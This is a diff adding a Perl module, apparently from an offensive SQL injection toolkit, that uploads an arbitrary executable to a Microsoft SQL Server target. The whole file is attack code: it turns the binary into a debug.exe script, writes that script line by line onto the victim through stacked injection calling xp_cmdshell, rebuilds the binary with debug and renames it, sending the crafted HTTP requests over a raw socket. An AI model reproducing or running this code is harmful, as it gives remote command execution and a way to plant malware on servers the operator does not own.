@@ -1,0 +1,173 @@
+#!/usr/bin/perl
+# 
+
+return 1;
+sub uploadfile {
+
+################
+# Prepare file
+# in tmp folder
+################
+
+
+@uploadvars=@_;
+
+	$httptemplate =$uploadvars[0];		# get the HTTP request the structure
+	$filename=$uploadvars[1];		# file name to upload
+	$destination_path=$uploadvars[2];	# destination path
+
+	($filep,$ext)=split(/\./,$filename); # seperate filename from extension
+	
+	(@fileguff)=split(/\\/,$filep);	#seperate filename from path
+	$file=pop(@fileguff); chomp $file;
+	
+	print "\n[*] Copying File $filename to a $file\.com\n";
+
+	system("copy $filename $file.com");
+	
+	print "[*] Making debug script from $file\.com \($file.scr\)\n";
+		
+	$target_file ='./tmp/'.$file. '.scr';
+
+	system("./utils/scrmake.exe -i $file\.com -o $target_file");
+
+
+
+open (HEX,"./tmp/$file\.scr"); # open debug script
+
+
+$lines = 0;
+print "[*] uploading $file\.scr to $destination_path$file\.scr\n";
+while (<HEX>) {
+
+	$httpstruct=$httptemplate;	# Prepar misc variables
+	$prependstr = $qt . ";";	# Add quote if enabled
+	$lines++;
+	chomp;
+ 	
+$command = "+exec+master..xp_cmdshell+'echo " . $_ . ' >>' . $destination_path . "$file\.scr";	# String SQL together
+
+$postinfo = 	$prependstr.$command ."'--"; # This is the GET/POST SQL injection string
+$postinfo=~s/ /+/g;
+$postinfo=~s/'/%27/g;
+$postinfo=~s/>/%3E/g;
+$postinfo=~s/:/%3A/g;
+$postinfo=~s/\\/%5C/g;
+
+ 
+
+$httpstruct=~s/QUERYHERE/$postinfo/g;
+
+
+		$pst_len=length($postinfo);		# Inserts length of post for POSTS
+		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
+		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
+		$httpstruct=~s/REPLACEME/$pst_len/g;	# 
+
+
+ 	@results=sendraw("$httpstruct");
+	print"[*] Lines written: $lines\r";
+	}
+ 
+close(HEX);
+
+
+################
+# run it thro
+# debug.exe 
+################
+
+#sleep(5);
+$httpstruct=$httptemplate;	# Prepar misc variables
+print "[*] Executing debug < $destination_path$file\.scr'\n";
+
+$command = "+exec+master..xp_cmdshell+'debug < $destination_path$file\.scr";# last quote missing cos its added later
+
+$postinfo = 	$prependstr.$command ."'--"; # This is the GET/POST SQL injection string
+$postinfo=~s/ /+/g;
+$postinfo=~s/'/%27/g;
+$postinfo=~s/>/%3E/g;
+$postinfo=~s/:/%3A/g;
+$postinfo=~s/\\/%5C/g;
+
+ 
+
+$httpstruct=~s/QUERYHERE/$postinfo/g;
+
+
+		$pst_len=length($postinfo);		# Inserts length of post for POSTS
+		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
+		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
+		$httpstruct=~s/REPLACEME/$pst_len/g;	# 
+ 	#print "$httpstruct";
+	@results=sendraw("$httpstruct");
+	print"[*] Lines written: $lines\r";
+
+################
+# rename it back 
+# to origional
+################
+#sleep(5);
+
+$httpstruct=$httptemplate;	# Prepar misc variables
+print "[*] Renaming back to $file.$ext \n";
+
+$command = " exec master..xp_cmdshell 'move $file\.com $destination_path$file.$ext"; # last quote missing cos its added later
+
+$postinfo = 	$prependstr.$command ."'--"; # This is the GET/POST SQL injection string
+$postinfo=~s/ /+/g;
+$postinfo=~s/'/%27/g;
+$postinfo=~s/>/%3E/g;
+$postinfo=~s/:/%3A/g;
+$postinfo=~s/\\/%5C/g;
+
+ 
+
+$httpstruct=~s/QUERYHERE/$postinfo/g;
+
+
+		$pst_len=length($postinfo);		# Inserts length of post for POSTS
+		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
+		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
+		$httpstruct=~s/REPLACEME/$pst_len/g;	# 
+
+	
+ 	@results=sendraw("$httpstruct");
+	print"[*] Lines written: $lines\r";
+
+################
+# Done
+# 
+################
+
+print "\n[*] File uploaded\n";
+
+}
+
+
+
+# -------------sendraw - borrowed from Rain Forest Puppy, cheers
+sub sendraw {
+ my ($pstr)=@_;
+ socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("socket problems\n");
+ if(connect(S,pack "SnA4x8",2,$port,$target)){
+  my @in="";
+  select(S); $|=1; print $pstr;
+  while(<S>) {
+   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
+  select(STDOUT); return @in;
+ } else { die("connect problems\n"); }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
